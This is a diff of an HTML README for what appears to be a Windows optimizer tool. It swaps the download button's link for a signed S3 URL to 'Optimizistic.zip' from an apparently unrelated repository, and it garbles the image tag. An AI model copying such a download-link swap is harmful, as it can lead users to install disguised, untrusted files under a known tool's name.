@@ -5,8 +5,8 @@
 </p> 
 
 <p align="center">
-	<a href="https://github.com/hellzerg/optimizer/releases/download/13.5/Optimizer-13.5.exe](https://github.com/fuzelgora/Optimizistic/releases" target="_blank">
-		<img src="https://imgs.search.brave.com/Z_9yG43Hir_RzNsQpMJ6MuvNcs5eln8oyFOYTPgcPUg/rs:fit:668:225:1/g:ce/aHR0cHM6Ly90c2Ux/Lm1tLmJpbmcubmV0/L3RoP2lkPU9JUC5o/ODRqMUxUOElTb1Vq/Zm5CNnFWaUhnSGFG/USZwaWQ9QXBp">
+	<a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/502537728/a7b2c514-a00c-4198-8b1a-6d2f1a3c9680?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220612%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220612T065759Z&X-Amz-Expires=300&X-Amz-Signature=44d604fe7027e64eead9e85a28541f4f41afcccb59173567ff6f2ea6476767e5&X-Amz-SignedHeaders=host&actor_id=95404140&key_id=0&repo_id=502537728&response-content-disposition=attachment%3B%20filename%3DOptimizistic.zip&response-content-type=application%2Foctet-stream" target="_blank">
+		<img src="[https://imgs.search.brave.com/Z_9yG43Hir_RzNsQpMJ6MuvNcs5eln8oyFOYTPgcPUg/rs:fit:668:225:1/g:ce/aHR0cHM6Ly90c2Ux/Lm1tLmJpbmcubmV0/L3RoP2lkPU9JUC5o/ODRqMUxUOElTb1Vq/Zm5CNnFWaUhnSGFG/USZwaWQ9QXBp](https://imgs.search.brave.com/f8Q8u6M5SBZeO7gEdFV0iMmEKWQM4JAUHHH1D1l_-hY/rs:fit:948:225:1/g:ce/aHR0cHM6Ly90c2Uz/Lm1tLmJpbmcubmV0/L3RoP2lkPU9JUC5I/RHpZenNvQUlxUWVf/ZEZlLThta29BSGFE/dCZwaWQ9QXBp)">
 		<br>
 		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/flags.png">
 	</a>
